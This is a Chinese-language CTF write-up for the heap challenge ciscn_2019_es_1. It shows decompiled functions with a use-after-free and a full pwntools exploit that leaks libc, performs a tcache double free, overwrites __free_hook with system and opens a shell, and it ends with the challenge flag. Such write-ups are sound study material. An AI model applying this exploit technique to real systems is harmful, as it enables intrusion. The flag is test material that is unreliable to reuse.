# ciscn_2019_es_1

[题目地址](https://buuoj.cn/challenges#ciscn_2019_es_1)

之前记的[tcache](https://www.jianshu.com/p/3ef98e86a913)入门不知道去哪了，再记一篇，反正对于我这个菜狗来说完全不嫌多。

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

从main函数能体会到出题人与996的爱恨情仇。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+24h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("I hate 2.29 , can you understand me?");
  puts("maybe you know the new libc");
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      __isoc99_scanf("%d", &v3);
      getchar();
      if ( v3 != 2 )
        break;
      show();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        call();
      }
      else
      {
        if ( v3 == 4 )
        {
          puts("Jack Ma doesn't like you~");
          exit(0);
        }
LABEL_13:
        puts("Wrong");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      add();
    }
  }
}
```

add函数还是主要看堆块的结构。[wp](https://blog.csdn.net/mcmuyanga/article/details/118193874)的图很清楚，我懒得调试了，pie开了不好调，摆大烂。

```c
unsigned __int64 add()
{
  int v1; // [rsp+4h] [rbp-3Ch]
  void **v2; // [rsp+8h] [rbp-38h]
  size_t size[5]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( heap_number > 12 )
  {
    puts("Enough!");
    exit(0);
  }
  v1 = heap_number;
  *((_QWORD *)&heap_addr + v1) = malloc(0x18uLL);
  puts("Please input the size of compary's name");
  __isoc99_scanf("%d", size);
  *(_DWORD *)(*((_QWORD *)&heap_addr + heap_number) + 8LL) = size[0];
  v2 = (void **)*((_QWORD *)&heap_addr + heap_number);
  *v2 = malloc(LODWORD(size[0]));
  puts("please input name:");
  read(0, **((void ***)&heap_addr + heap_number), LODWORD(size[0]));
  puts("please input compary call:");
  read(0, (void *)(*((_QWORD *)&heap_addr + heap_number) + 12LL), 0xCuLL);
  *(_BYTE *)(*((_QWORD *)&heap_addr + heap_number) + 23LL) = 0;
  puts("Done!");
  ++heap_number;
  return __readfsqword(0x28u) ^ v4;
}
```

大致结构就是heap_addr存放chunk地址，chunk里面存放的则是存放公司名的chunk的地址和电话号码。show函数日常打印内容，担任泄露地址的重要任务。

```c
unsigned __int64 show()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Please input the index:");
  __isoc99_scanf("%d", &v1);
  getchar();
  if ( *((_QWORD *)&heap_addr + v1) )
  {
    puts("name:");
    puts(**((const char ***)&heap_addr + v1));
    puts("phone:");
    puts((const char *)(*((_QWORD *)&heap_addr + v1) + 12LL));
  }
  puts("Done!");
  return __readfsqword(0x28u) ^ v2;
}

```

call函数uaf。

```c
unsigned __int64 call()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Please input the index:");
  __isoc99_scanf("%d", &v1);
  if ( *((_QWORD *)&heap_addr + v1) )
    free(**((void ***)&heap_addr + v1));
  puts("You try it!");
  puts("Done");
  return __readfsqword(0x28u) ^ v2;
}

```

直接看exp，分析直接写在exp上比较好。

```python
from pwn import *

context.log_level="debug"
sh=remote('node4.buuoj.cn',27025)

def add(size,name,compary):
	sh.sendlineafter('choice:','1')
	sh.sendlineafter("compary's name",str(int(size)))
	sh.sendafter('input name:',name)
	sh.sendafter('call:',compary)

def show(index):
	sh.sendlineafter('choice:','2')
	sh.sendlineafter('\n',str(index))

def call(index):
	sh.sendlineafter('choice','3')
	sh.sendlineafter('\n',str(index))
add(0x410,'a','a') #由于libc 2.27 tcache的引入，0x410大小的堆块在free后才能进入unsroted bin
add(0x20,'b','b') #后面tcache double free（tcache dup）用
add(0x20,'/bin/sh','/bin/sh') #最后getshell用
call(0) #free 0号堆块，现在0号堆块的fd处就是固定地址，可根据固定偏移算libc
show(0) #打印地址
base=u64(sh.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-96-0x10-4111408 #算libc
system=base+324672
call(1) #tcache无需任何铺垫，直接free一个堆块两次都没问题
call(1) #构造tcache链 堆块0<-堆块0
add(0x20,p64(base+4118760),'a') #这里获取到了刚才free的1号堆块，此时编辑user data区就是更改fd。这里更改为free_hook的位置。当前tcache链 free_hook<-堆块0
add(0x20,'a','a') #这里取到的还是1号堆块，刚才fd已经改掉了，这里就不用理了。当前tcache链 free_hook
add(0x20,p64(system),'a') #拿到free_hook周边区域，编辑成system
call(2)
sh.interactive()
```

## Flag
> flag{b2274e03-efe9-44b3-8cfc-9d7bf3ba368a}